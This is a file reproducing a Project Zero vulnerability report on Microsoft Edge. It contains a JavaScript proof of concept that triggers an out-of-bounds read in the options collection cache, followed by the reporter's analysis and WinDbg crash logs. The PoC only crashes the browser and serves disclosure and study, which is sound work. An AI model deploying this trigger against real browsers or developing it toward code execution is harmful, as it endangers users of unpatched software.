@@ -1,0 +1,230 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1301
+
+There is an out-of-bounds read issue in Microsoft Edge that could potentially be turned into remote code execution. The vulnerability has been confirmed on Microsoft Edge 38.14393.1066.0 (Microsoft EdgeHTML 14.14393) as well as Microsoft Edge 40.15063.0.0 (Microsoft EdgeHTML 15.15063).
+
+PoC:
+
+==========================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<script>
+function go() {
+  select1.multiple = false;
+  var optgroup = document.createElement("optgroup");
+  select1.add(optgroup);
+  var options = select1.options;
+  select2 = document.createElement("select");
+  textarea.setSelectionRange(0,1000000);
+  select1.length = 2;
+  document.getElementsByTagName('option')[0].appendChild(textarea);
+  select1.multiple = true;
+  textarea.setSelectionRange(0,1000000);
+  document.execCommand("insertOrderedList", false);
+  select2.length = 100;
+  select2.add(optgroup);
+  //alert(options.length);
+  var test = options[4];
+  //alert(test);
+}
+</script>
+<body onload=go()>
+<textarea id="textarea"></textarea>
+<select id="select1" contenteditable="true"></select>
+
+<!--
+=========================================
+
+Preliminary analysis:
+
+When opening the PoC in Edge under normal circumstances, the content process will occasionally crash somewhere inside Js::CustomExternalObject::GetItem  (see Debug Log 1 below) which corresponds to  'var test = options[4];' line in the PoC. Note that multiple page refreshes are usually needed to get the crash.
+
+The real cause of the crash can be seen if Page Heap is applied to the MicrosoftEdgeCP.exe process and MemGC is disabled with OverrideMemoryProtectionSetting=0 registry flag (otherwise Page Heap settings won't apply to the MemGC heap). In that case an out-of-bounds read can be reliably observed in COptionsCollectionCacheItem::GetAt function (see Debug Log 2 below). What happens is that Edge thinks 'options' array contains 102 elements (this can be verified by uncommenting 'alert(options.length);' line in the PoC), however in reality the Options cache buffer is going to be smaller and only contain 2 elements. Thus if an attacker requests an object that is past the end of the cache buffer (note: the offset is chosen by the attacker) an incorrect object may be returned which can potentially be turned into a remote code execution.
+
+Note: Debug logs were obtained on an older version of Edge for which symbols were available. However I verified that the bug also affects the latest version.
+
+Debug log 1:
+
+=========================================
+
+(1790.17bc): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+chakra!Js::CrossSite::MarshalVar+0x37:
+00007ffa`c8dc23f7 488b4808        mov     rcx,qword ptr [rax+8] ds:00000001`afccb7dc=????????????????
+
+0:010> k
+ # Child-SP          RetAddr           Call Site
+00 00000071`3ecfb090 00007ffa`c8dc0c92 chakra!Js::CrossSite::MarshalVar+0x37
+01 00000071`3ecfb0c0 00007ffa`c8d959c8 chakra!Js::CustomExternalObject::GetItem+0x1c2
+02 00000071`3ecfb1a0 00007ffa`c8d92d84 chakra!Js::JavascriptOperators::GetItem+0x78
+03 00000071`3ecfb200 00007ffa`c8dfc1e0 chakra!Js::JavascriptOperators::GetElementIHelper+0xb4
+04 00000071`3ecfb290 00007ffa`c8d85ac1 chakra!Js::JavascriptOperators::OP_GetElementI+0x1c0
+05 00000071`3ecfb2f0 00007ffa`c8d8933f chakra!Js::ProfilingHelpers::ProfiledLdElem+0x1b1
+06 00000071`3ecfb380 00007ffa`c8d8e639 chakra!Js::InterpreterStackFrame::OP_ProfiledGetElementI<Js::OpLayoutT_ElementI<Js::LayoutSizePolicy<0> > >+0x5f
+07 00000071`3ecfb3c0 00007ffa`c8d8c852 chakra!Js::InterpreterStackFrame::ProcessProfiled+0x179
+08 00000071`3ecfb450 00007ffa`c8d90920 chakra!Js::InterpreterStackFrame::Process+0x142
+09 00000071`3ecfb4b0 00007ffa`c8d92065 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x4a0
+0a 00000071`3ecfb860 000001b7`d68e0fb2 chakra!Js::InterpreterStackFrame::InterpreterThunk+0x55
+0b 00000071`3ecfb8b0 00007ffa`c8e77273 0x000001b7`d68e0fb2
+0c 00000071`3ecfb8e0 00007ffa`c8d85763 chakra!amd64_CallFunction+0x93
+0d 00000071`3ecfb930 00007ffa`c8d88260 chakra!Js::JavascriptFunction::CallFunction<1>+0x83
+0e 00000071`3ecfb990 00007ffa`c8d8ccfd chakra!Js::InterpreterStackFrame::OP_CallI<Js::OpLayoutDynamicProfile<Js::OpLayoutT_CallI<Js::LayoutSizePolicy<0> > > >+0x110
+0f 00000071`3ecfb9e0 00007ffa`c8d8c8b7 chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x32d
+10 00000071`3ecfba70 00007ffa`c8d90920 chakra!Js::InterpreterStackFrame::Process+0x1a7
+11 00000071`3ecfbad0 00007ffa`c8d92065 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x4a0
+12 00000071`3ecfbe20 000001b7`d68e0fba chakra!Js::InterpreterStackFrame::InterpreterThunk+0x55
+13 00000071`3ecfbe70 00007ffa`c8e77273 0x000001b7`d68e0fba
+14 00000071`3ecfbea0 00007ffa`c8d85763 chakra!amd64_CallFunction+0x93
+15 00000071`3ecfbef0 00007ffa`c8dba4bc chakra!Js::JavascriptFunction::CallFunction<1>+0x83
+16 00000071`3ecfbf50 00007ffa`c8db9a86 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x104
+17 00000071`3ecfc040 00007ffa`c8e5c359 chakra!Js::JavascriptFunction::CallRootFunction+0x4a
+18 00000071`3ecfc0b0 00007ffa`c8dbff21 chakra!ScriptSite::CallRootFunction+0xb5
+19 00000071`3ecfc150 00007ffa`c8dbbadc chakra!ScriptSite::Execute+0x131
+1a 00000071`3ecfc1e0 00007ffa`c97d08dd chakra!ScriptEngineBase::Execute+0xcc
+1b 00000071`3ecfc280 00007ffa`c97d0828 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
+1c 00000071`3ecfc2d0 00007ffa`c970a8c7 edgehtml!CJScript9Holder::ExecuteCallback+0x18
+1d 00000071`3ecfc310 00007ffa`c970a6b7 edgehtml!CListenerDispatch::InvokeVar+0x1fb
+1e 00000071`3ecfc490 00007ffa`c97cf22a edgehtml!CListenerDispatch::Invoke+0xdb
+1f 00000071`3ecfc510 00007ffa`c98a40d2 edgehtml!CEventMgr::_InvokeListeners+0x2ca
+20 00000071`3ecfc670 00007ffa`c9720ac5 edgehtml!CEventMgr::_InvokeListenersOnWindow+0x66
+21 00000071`3ecfc6a0 00007ffa`c9720553 edgehtml!CEventMgr::Dispatch+0x405
+22 00000071`3ecfc970 00007ffa`c97fd8da edgehtml!CEventMgr::DispatchEvent+0x73
+23 00000071`3ecfc9c0 00007ffa`c983ba12 edgehtml!COmWindowProxy::Fire_onload+0x14e
+24 00000071`3ecfcad0 00007ffa`c983a6a6 edgehtml!CMarkup::OnLoadStatusDone+0x376
+25 00000071`3ecfcb90 00007ffa`c983a21f edgehtml!CMarkup::OnLoadStatus+0x112
+26 00000071`3ecfcbc0 00007ffa`c97c5b43 edgehtml!CProgSink::DoUpdate+0x3af
+27 00000071`3ecfd050 00007ffa`c97c7300 edgehtml!GlobalWndOnMethodCall+0x273
+28 00000071`3ecfd150 00007ffa`e7571c24 edgehtml!GlobalWndProc+0x130
+29 00000071`3ecfd210 00007ffa`e757156c user32!UserCallWinProcCheckWow+0x274
+2a 00000071`3ecfd370 00007ffa`c0cccdf1 user32!DispatchMessageWorker+0x1ac
+2b 00000071`3ecfd3f0 00007ffa`c0ccc3b1 EdgeContent!CBrowserTab::_TabWindowThreadProc+0x4a1
+2c 00000071`3ecff640 00007ffa`dd649596 EdgeContent!LCIETab_ThreadProc+0x2c1
+2d 00000071`3ecff760 00007ffa`e4f58364 iertutil!SettingStore::CSettingsBroker::SetValue+0x246
+2e 00000071`3ecff790 00007ffa`e77d70d1 KERNEL32!BaseThreadInitThunk+0x14
+2f 00000071`3ecff7c0 00000000`00000000 ntdll!RtlUserThreadStart+0x21
+
+0:010> r
+rax=00000001afccb7d4 rbx=000001b7d669fd80 rcx=ffff000000000000
+rdx=00000001afccb7d4 rsi=000001afce6556d0 rdi=000000713ecfb250
+rip=00007ffac8dc23f7 rsp=000000713ecfb090 rbp=000000713ecfb141
+ r8=0000000000000000  r9=000001b7d8a94bd0 r10=0000000000000005
+r11=000001b7d9ebcee0 r12=0000000000000003 r13=0001000000000004
+r14=0000000000000004 r15=000001afce6556d0
+iopl=0         nv up ei pl zr na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+chakra!Js::CrossSite::MarshalVar+0x37:
+00007ffa`c8dc23f7 488b4808        mov     rcx,qword ptr [rax+8] ds:00000001`afccb7dc=????????????????
+
+=========================================
+
+
+Debug log 2 (with Page Heap on for MicrosoftEdgeCP.exe and MemGC disabled):
+
+=========================================
+
+(de8.13c8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+edgehtml!COptionsCollectionCacheItem::GetAt+0x51:
+00007ffa`c96b1581 488b04d0        mov     rax,qword ptr [rax+rdx*8] ds:000001b6`52743000=????????????????
+
+0:010> k
+ # Child-SP          RetAddr           Call Site
+00 00000091`94ffb2c0 00007ffa`c9569bb2 edgehtml!COptionsCollectionCacheItem::GetAt+0x51
+01 00000091`94ffb2f0 00007ffa`c8dc0c51 edgehtml!CElementCollectionTypeOperations::GetOwnItem+0x122
+02 00000091`94ffb330 00007ffa`c8d959c8 chakra!Js::CustomExternalObject::GetItem+0x181
+03 00000091`94ffb410 00007ffa`c8d92d84 chakra!Js::JavascriptOperators::GetItem+0x78
+04 00000091`94ffb470 00007ffa`c8dfc1e0 chakra!Js::JavascriptOperators::GetElementIHelper+0xb4
+05 00000091`94ffb500 00007ffa`c8d85ac1 chakra!Js::JavascriptOperators::OP_GetElementI+0x1c0
+06 00000091`94ffb560 00007ffa`c8d8933f chakra!Js::ProfilingHelpers::ProfiledLdElem+0x1b1
+07 00000091`94ffb5f0 00007ffa`c8d8e639 chakra!Js::InterpreterStackFrame::OP_ProfiledGetElementI<Js::OpLayoutT_ElementI<Js::LayoutSizePolicy<0> > >+0x5f
+08 00000091`94ffb630 00007ffa`c8d8c852 chakra!Js::InterpreterStackFrame::ProcessProfiled+0x179
+09 00000091`94ffb6c0 00007ffa`c8d90920 chakra!Js::InterpreterStackFrame::Process+0x142
+0a 00000091`94ffb720 00007ffa`c8d92065 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x4a0
+0b 00000091`94ffbad0 000001b6`4f600fb2 chakra!Js::InterpreterStackFrame::InterpreterThunk+0x55
+0c 00000091`94ffbb20 00007ffa`c8e77273 0x000001b6`4f600fb2
+0d 00000091`94ffbb50 00007ffa`c8d85763 chakra!amd64_CallFunction+0x93
+0e 00000091`94ffbba0 00007ffa`c8d88260 chakra!Js::JavascriptFunction::CallFunction<1>+0x83
+0f 00000091`94ffbc00 00007ffa`c8d8ccfd chakra!Js::InterpreterStackFrame::OP_CallI<Js::OpLayoutDynamicProfile<Js::OpLayoutT_CallI<Js::LayoutSizePolicy<0> > > >+0x110
+10 00000091`94ffbc50 00007ffa`c8d8c8b7 chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x32d
+11 00000091`94ffbce0 00007ffa`c8d90920 chakra!Js::InterpreterStackFrame::Process+0x1a7
+12 00000091`94ffbd40 00007ffa`c8d92065 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x4a0
+13 00000091`94ffc090 000001b6`4f600fba chakra!Js::InterpreterStackFrame::InterpreterThunk+0x55
+14 00000091`94ffc0e0 00007ffa`c8e77273 0x000001b6`4f600fba
+15 00000091`94ffc110 00007ffa`c8d85763 chakra!amd64_CallFunction+0x93
+16 00000091`94ffc160 00007ffa`c8dba4bc chakra!Js::JavascriptFunction::CallFunction<1>+0x83
+17 00000091`94ffc1c0 00007ffa`c8db9a86 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x104
+18 00000091`94ffc2b0 00007ffa`c8e5c359 chakra!Js::JavascriptFunction::CallRootFunction+0x4a
+19 00000091`94ffc320 00007ffa`c8dbff21 chakra!ScriptSite::CallRootFunction+0xb5
+1a 00000091`94ffc3c0 00007ffa`c8dbbadc chakra!ScriptSite::Execute+0x131
+1b 00000091`94ffc450 00007ffa`c97d08dd chakra!ScriptEngineBase::Execute+0xcc
+1c 00000091`94ffc4f0 00007ffa`c97d0828 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
+1d 00000091`94ffc540 00007ffa`c970a8c7 edgehtml!CJScript9Holder::ExecuteCallback+0x18
+1e 00000091`94ffc580 00007ffa`c970a6b7 edgehtml!CListenerDispatch::InvokeVar+0x1fb
+1f 00000091`94ffc700 00007ffa`c97cf22a edgehtml!CListenerDispatch::Invoke+0xdb
+20 00000091`94ffc780 00007ffa`c98a40d2 edgehtml!CEventMgr::_InvokeListeners+0x2ca
+21 00000091`94ffc8e0 00007ffa`c9720ac5 edgehtml!CEventMgr::_InvokeListenersOnWindow+0x66
+22 00000091`94ffc910 00007ffa`c9720553 edgehtml!CEventMgr::Dispatch+0x405
+23 00000091`94ffcbe0 00007ffa`c97fd8da edgehtml!CEventMgr::DispatchEvent+0x73
+24 00000091`94ffcc30 00007ffa`c983ba12 edgehtml!COmWindowProxy::Fire_onload+0x14e
+25 00000091`94ffcd40 00007ffa`c983a6a6 edgehtml!CMarkup::OnLoadStatusDone+0x376
+26 00000091`94ffce00 00007ffa`c983a21f edgehtml!CMarkup::OnLoadStatus+0x112
+27 00000091`94ffce30 00007ffa`c97c5b43 edgehtml!CProgSink::DoUpdate+0x3af
+28 00000091`94ffd2c0 00007ffa`c97c7300 edgehtml!GlobalWndOnMethodCall+0x273
+29 00000091`94ffd3c0 00007ffa`e7571c24 edgehtml!GlobalWndProc+0x130
+2a 00000091`94ffd480 00007ffa`e757156c user32!UserCallWinProcCheckWow+0x274
+2b 00000091`94ffd5e0 00007ffa`c0d2cdf1 user32!DispatchMessageWorker+0x1ac
+2c 00000091`94ffd660 00007ffa`c0d2c3b1 EdgeContent!CBrowserTab::_TabWindowThreadProc+0x4a1
+2d 00000091`94fff8b0 00007ffa`dd649596 EdgeContent!LCIETab_ThreadProc+0x2c1
+2e 00000091`94fff9d0 00007ffa`e4f58364 iertutil!SettingStore::CSettingsBroker::SetValue+0x246
+2f 00000091`94fffa00 00007ffa`e77d70d1 KERNEL32!BaseThreadInitThunk+0x14
+30 00000091`94fffa30 00000000`00000000 ntdll!RtlUserThreadStart+0x21
+
+0:010> r
+rax=000001b652742fe0 rbx=0000000000000004 rcx=000001b64f877f30
+rdx=0000000000000004 rsi=0000000000000000 rdi=000001b651ecffd0
+rip=00007ffac96b1581 rsp=0000009194ffb2c0 rbp=000001b64f3bcc60
+ r8=0000000000000005  r9=000001b651ed9e50 r10=0000000000000005
+r11=000001b65343ef20 r12=0000009194ffb370 r13=0001000000000004
+r14=0000000000000000 r15=0000000000000004
+iopl=0         nv up ei ng nz na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
+edgehtml!COptionsCollectionCacheItem::GetAt+0x51:
+00007ffa`c96b1581 488b04d0        mov     rax,qword ptr [rax+rdx*8] ds:000001b6`52743000=????????????????
+
+0:010> !heap -p -a 000001b6`52742ff0
+    address 000001b652742ff0 found in
+    _DPH_HEAP_ROOT @ 1ae3fae1000
+    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
+                             1b652a5fd68:      1b652742fe0               20 -      1b652742000             2000
+    00007ffae783fd99 ntdll!RtlDebugAllocateHeap+0x000000000003bf65
+    00007ffae782db7c ntdll!RtlpAllocateHeap+0x0000000000083fbc
+    00007ffae77a8097 ntdll!RtlpAllocateHeapInternal+0x0000000000000727
+    00007ffac9958547 edgehtml!`TextInput::TextInputLogging::Instance'::`2'::`dynamic atexit destructor for 'wrapper''+0x0000000000010457
+    00007ffac96d1483 edgehtml!CImplAry::EnsureSizeWorker+0x0000000000000093
+    00007ffac9882261 edgehtml!CImplPtrAry::Append+0x0000000000000051
+    00007ffac9589543 edgehtml!CSelectElement::AppendOption+0x000000000000002f
+    00007ffac95892e1 edgehtml!CSelectElement::BuildOptionsCache+0x00000000000000e1
+    00007ffac9e7f044 edgehtml!CSelectElement::Morph+0x00000000000000d0
+    00007ffac9a4e7cf edgehtml!`TextInput::TextInputLogging::Instance'::`2'::`dynamic atexit destructor for 'wrapper''+0x00000000001066df
+    00007ffac9605f85 edgehtml!SetNumberPropertyHelper<long,CSetIntegerPropertyHelper>+0x0000000000000255
+    00007ffac9605d23 edgehtml!NUMPROPPARAMS::SetNumberProperty+0x000000000000003b
+    00007ffac9605bda edgehtml!CBase::put_BoolHelper+0x000000000000004a
+    00007ffac9c6f1d1 edgehtml!CFastDOM::CHTMLSelectElement::Trampoline_Set_multiple+0x000000000000013d
+    00007ffac9916b55 edgehtml!CFastDOM::CHTMLSelectElement::Profiler_Set_multiple+0x0000000000000025
+    00007ffac8ce6d07 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x0000000000000177
+    00007ffac8dc2640 chakra!Js::LeaveScriptObject<1,1,0>::LeaveScriptObject<1,1,0>+0x0000000000000180
+    00007ffac8e62209 chakra!Js::JavascriptOperators::CallSetter+0x00000000000000a9
+    00007ffac8de7151 chakra!Js::CacheOperators::TrySetProperty<1,1,1,1,1,1,0,1>+0x00000000000002d1
+    00007ffac8de6ce6 chakra!Js::ProfilingHelpers::ProfiledStFld<0>+0x00000000000000d6
+    00007ffac8d89a70 chakra!Js::InterpreterStackFrame::OP_ProfiledSetProperty<Js::OpLayoutT_ElementCP<Js::LayoutSizePolicy<0> > const >+0x0000000000000070
+    00007ffac8d8e800 chakra!Js::InterpreterStackFrame::ProcessProfiled+0x0000000000000340
+    00007ffac8d8c852 chakra!Js::InterpreterStackFrame::Process+0x0000000000000142
+    00007ffac8d90920 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x00000000000004a0
+    00007ffac8d92065 chakra!Js::InterpreterStackFrame::InterpreterThunk+0x0000000000000055
+    000001b64f600fb2 +0x000001b64f600fb2
+
+=========================================
+-->
